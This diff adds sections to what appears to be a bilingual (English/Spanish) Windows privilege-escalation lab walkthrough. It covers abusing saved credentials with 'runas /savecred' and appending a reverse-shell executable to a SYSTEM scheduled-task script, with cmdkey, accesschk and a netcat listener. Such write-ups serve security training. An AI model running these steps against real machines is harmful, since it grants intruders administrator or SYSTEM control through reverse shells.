@@ -288,3 +288,138 @@ net start unquotedsvc
 - Esto lanza la shell reversa y otorga acceso remoto a la máquina víctima.
 
 ---
+
+## Passwords - Saved Creds
+
+### Listing Saved Credentials
+List any saved credentials:
+
+```cmd
+cmdkey /list
+```
+
+Note that credentials for the "admin" user are saved. If they aren't, run the following script to refresh the saved credentials:
+
+```cmd
+C:\PrivEsc\savecred.bat
+```
+
+### Using Saved Credentials to Execute a Reverse Shell
+Start a listener on Kali and run the `reverse.exe` executable using `runas` with the admin user's saved credentials:
+
+```cmd
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+# Explotación de Credenciales Guardadas con `runas /savecred`
+
+## 📌 Descripción
+Este documento explica cómo explotar credenciales guardadas en Windows utilizando `cmdkey` y `runas /savecred` para ejecutar un binario malicioso con privilegios elevados.
+
+---
+
+## 🔍 1. Listar credenciales guardadas
+
+```powershell
+cmdkey /list
+```
+- Se usa `cmdkey` para ver las credenciales almacenadas en el sistema.
+- Si las credenciales del usuario **admin** están guardadas, es posible usarlas sin necesidad de ingresar la contraseña.
+
+---
+
+## 🛠 2. Asegurar que las credenciales están disponibles
+
+```powershell
+C:\PrivEsc\savecred.bat
+```
+- Si las credenciales de `admin` no están almacenadas, se ejecuta el script `savecred.bat` para guardarlas nuevamente en el sistema.
+
+---
+
+## 💻 3. Ejecutar el payload con `runas /savecred`
+
+```powershell
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+- **`runas /savecred`** ejecuta un programa con las credenciales guardadas, sin pedir la contraseña.
+- **Ejecuta `reverse.exe` con privilegios de `admin`**, logrando una escalada de privilegios si `reverse.exe` es un payload malicioso.
+- **El archivo `reverse.exe` debe estar en `C:\PrivEsc\`**, ya que `runas` lo ejecutará desde esa ubicación.
+
+---
+
+## Scheduled Tasks
+
+### Viewing the Script
+View the contents of the `C:\DevTools\CleanUp.ps1` script:
+
+```cmd
+type C:\DevTools\CleanUp.ps1
+```
+
+The script seems to be running as SYSTEM every minute. Using `accesschk.exe`, check if you have the ability to write to this file:
+
+```cmd
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+
+### Exploiting the Scheduled Task
+Start a listener on Kali and then append a line to `C:\DevTools\CleanUp.ps1` which runs the `reverse.exe` executable:
+
+```cmd
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
+
+# Explotación de Permisos en Scripts de PowerShell (`.ps1`)
+
+## 📌 Descripción
+Este documento describe cómo explotar permisos inseguros en un script de PowerShell (`CleanUp.ps1`) para ejecutar código malicioso y obtener una shell reversa.
+
+---
+
+## 🔍 1. Ver el contenido del script
+
+```powershell
+type C:\DevTools\CleanUp.ps1
+```
+- Se revisa el contenido del script `CleanUp.ps1` para entender su propósito.
+- Si este script se ejecuta con privilegios elevados y **tiene permisos de escritura**, podemos modificarlo para ejecutar código malicioso.
+
+---
+
+## 🔍 2. Verificar permisos sobre el script
+
+```powershell
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+- **`accesschk.exe`** se usa para comprobar si el usuario tiene permisos de escritura sobre el script.
+- Si el usuario **puede modificar el script**, entonces es vulnerable a una escalada de privilegios.
+
+---
+
+## 🎧 3. Escuchar conexiones entrantes con Netcat
+
+```powershell
+nc -lvnp 8888
+```
+- Se inicia **Netcat** en modo escucha (`-lvnp`).
+- **Puerto 8888** es usado para recibir la conexión de la shell reversa.
+
+---
+
+## 💻 4. Inyectar el payload en el script
+
+```powershell
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+- Se agrega la ejecución de `reverse.exe` al script `CleanUp.ps1`.
+- **Cuando el script sea ejecutado**, `reverse.exe` también se ejecutará, estableciendo una shell reversa.
+
+---
+
+
+
+
+   
